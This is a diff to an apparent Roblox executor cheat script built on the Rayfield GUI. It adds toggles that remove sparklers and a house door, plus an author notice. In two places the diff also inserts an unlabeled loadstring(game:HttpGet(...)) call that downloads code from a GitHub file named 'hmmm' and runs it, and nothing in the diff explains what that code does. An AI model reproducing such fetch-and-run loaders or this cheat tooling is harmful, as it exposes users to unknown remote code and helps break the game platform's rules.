@@ -1,3 +1,4 @@
+
 local userId = game.Players.LocalPlayer.UserId
 
 if userId == 7264437267 or userId == 1505537066 then
@@ -17,6 +18,8 @@ local executorName = identifyexecutor()
 
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 print("Game Name: " .. gameName)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rolezeay/loading/refs/heads/main/hmmm"))()
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
@@ -67,6 +70,14 @@ local Window = Rayfield:CreateWindow({
       Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
+
+Rayfield:Notify({
+   Title = "ZYNLOPE",
+   Content = "newest gui is officialy discounted. and im not going to update it due to its errors. older gui is works for low executors like xeno/solara but newest works on higher executors. (because of the functions it has) theres a few useful stuff thats not in the older gui on the newest. but still keep using old gui. ",
+   Duration = 13,
+   Image = 4483362458,
+})
+
 local Tab = Window:CreateTab("Main", 16365563022) -- Title, Image
 
 local Section = Tab:CreateSection("Optional Settings")
@@ -87,8 +98,53 @@ local function updatePlayerCountNotification()
     end
 end
 
+local workspace = game:GetService("Workspace")
+local runService = game:GetService("RunService")
+
+local toggleEnabled = false
+local connection
+
 local Toggle = Tab:CreateToggle({
-   Name = "Remove doors", 
+   Name = "Remove sparklers (no lag when people use it)",
+   CurrentValue = false,
+   Flag = "ToggleSparkler",
+   Callback = function(Value)
+       toggleEnabled = Value
+       
+       if toggleEnabled then
+           -- Function to remove all existing Sparklers
+           local function removeSparklers()
+               for _, obj in ipairs(workspace:GetDescendants()) do
+                   if obj:IsA("Model") or obj:IsA("Part") then
+                       if obj.Name == "Sparkler" then
+                           obj:Destroy()
+                       end
+                   end
+               end
+           end
+           
+           -- Initial cleanup
+           removeSparklers()
+           
+           -- Connect to DescendantAdded event
+           connection = workspace.DescendantAdded:Connect(function(obj)
+               if obj.Name == "Sparkler" then
+                   obj:Destroy()
+               end
+           end)
+       else
+           -- Disconnect event to stop detection
+           if connection then
+               connection:Disconnect()
+               connection = nil
+           end
+       end
+   end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "Remove house doors (backyard)", 
    CurrentValue = false,
    Flag = "Toggle1", 
    Callback = function(Value)
@@ -3781,6 +3837,7 @@ else
     local player = game.Players.LocalPlayer
 local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
+
 game.StarterGui:SetCore("SendNotification", {
     Title = "meep fucker zynlope",
     Text = "Gui is loading..",
@@ -4068,6 +4125,7 @@ Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(msg) onChat(player, msg) end)
 end)
 
+
 game.StarterGui:SetCore("SendNotification", {
     Title = "zynlope",
     Text = "loading goodies..",
@@ -4081,6 +4139,8 @@ local executorName = identifyexecutor()
 
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 print("Game Name: " .. gameName)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rolezeay/loading/refs/heads/main/hmmm"))()
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
@@ -4131,6 +4191,14 @@ local Window = Rayfield:CreateWindow({
       Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
+
+Rayfield:Notify({
+   Title = "ZYNLOPE",
+   Content = "newest gui is officialy discounted. and im not going to update it due to its errors. older gui is works for low executors like xeno/solara but newest works on higher executors. (because of the functions it has) theres a few useful stuff thats not in the older gui on the newest. but still keep using old gui. ",
+   Duration = 13,
+   Image = 4483362458,
+})
+
 local Tab = Window:CreateTab("Main", 16365563022) -- Title, Image
 
 local Section = Tab:CreateSection("Optional Settings")
@@ -4150,6 +4218,91 @@ local function updatePlayerCountNotification()
         })
     end
 end
+
+local workspace = game:GetService("Workspace")
+local runService = game:GetService("RunService")
+
+local toggleEnabled = false
+local connection
+
+local Toggle = Tab:CreateToggle({
+   Name = "Remove sparklers (no lag when people use it)",
+   CurrentValue = false,
+   Flag = "ToggleSparkler",
+   Callback = function(Value)
+       toggleEnabled = Value
+       
+       if toggleEnabled then
+           -- Function to remove all existing Sparklers
+           local function removeSparklers()
+               for _, obj in ipairs(workspace:GetDescendants()) do
+                   if obj:IsA("Model") or obj:IsA("Part") then
+                       if obj.Name == "Sparkler" then
+                           obj:Destroy()
+                       end
+                   end
+               end
+           end
+           
+           -- Initial cleanup
+           removeSparklers()
+           
+           -- Connect to DescendantAdded event
+           connection = workspace.DescendantAdded:Connect(function(obj)
+               if obj.Name == "Sparkler" then
+                   obj:Destroy()
+               end
+           end)
+       else
+           -- Disconnect event to stop detection
+           if connection then
+               connection:Disconnect()
+               connection = nil
+           end
+       end
+   end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "Remove house doors (backyard)", 
+   CurrentValue = false,
+   Flag = "Toggle1", 
+   Callback = function(Value)
+       local door = game.Workspace:FindFirstChild("VW")
+       if door then
+           door = door:FindFirstChild("1")
+           if door then
+               door = door:FindFirstChild("NewDoorObject")
+           end
+       end
+
+       if Value then
+           -- Remove the door and save data
+           if door then
+               _G.SavedDoor = {
+                   Parent = door.Parent,
+                   Position = door:GetPivot(), -- Save position and orientation
+                   Clone = door:Clone() -- Store a clone of the door
+               }
+               door:Destroy()
+               print("NewDoorObject deleted and saved.")
+           else
+               print("NewDoorObject not found.")
+           end
+       else
+           -- Restore the door
+           if _G.SavedDoor and _G.SavedDoor.Clone then
+               local restoredDoor = _G.SavedDoor.Clone
+               restoredDoor.Parent = _G.SavedDoor.Parent
+               restoredDoor:PivotTo(_G.SavedDoor.Position) -- Restore position and orientation
+               print("NewDoorObject restored.")
+           else
+               print("No saved door to restore.")
+           end
+       end
+   end,
+})
 
 
 local Toggle = Tab:CreateToggle({
